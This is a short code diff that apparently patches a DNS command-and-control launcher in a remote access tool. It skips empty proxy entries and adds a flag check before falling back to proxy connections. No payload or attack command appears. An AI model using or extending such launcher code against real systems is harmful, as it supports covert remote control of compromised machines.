@@ -39,7 +39,8 @@ def find_proxies(additional_proxies=None):
         yield proxy_info
 
     for proxy_info in get_proxies(additional_proxies=additional_proxies):
-        yield proxy_info
+        if proxy_info:
+            yield proxy_info
 
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain, ns=None, qtype='A', ns_timeout=3):
@@ -357,7 +358,7 @@ class DNSCncLauncher(BaseLauncher):
                     else:
                         stream = self.try_direct_connect(command)
 
-                    if not stream:
+                    if not stream and command[4] is not False:
                         for stream in self.try_connect_via_proxy(command):
                             if stream:
                                 break
